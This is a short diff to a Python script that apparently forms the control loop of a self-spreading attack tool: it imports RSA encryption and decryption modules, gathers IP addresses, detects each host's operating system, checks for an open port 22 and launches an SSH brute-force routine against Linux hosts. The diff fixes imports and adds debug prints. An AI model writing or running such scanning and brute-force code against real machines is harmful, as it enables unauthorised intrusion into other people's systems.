@@ -7,13 +7,16 @@ import RSA_encryption as Rencrypt
 import RSA_decryption as Rdecrypt
 import get_ip 
 import get_os
-import SSH_brute_force.SSHBruteForce as ssh
+import SSHBruteForce as ssh
 import port_scan as port
 
 ip_list = get_ip.get_ip_()
+print(ip_list)
 for ip in ip_list:
    os_name = get_os.get_os_(ip)
-   port_22 = port_scan.check_open_port(ip)
+   port_22 = port.check_open_port(ip)
+   print(port_22)
+   print(os_name)
    if(os_name == 'Linux' and port_22 == True ):
           ssh.d_main(ip)
 
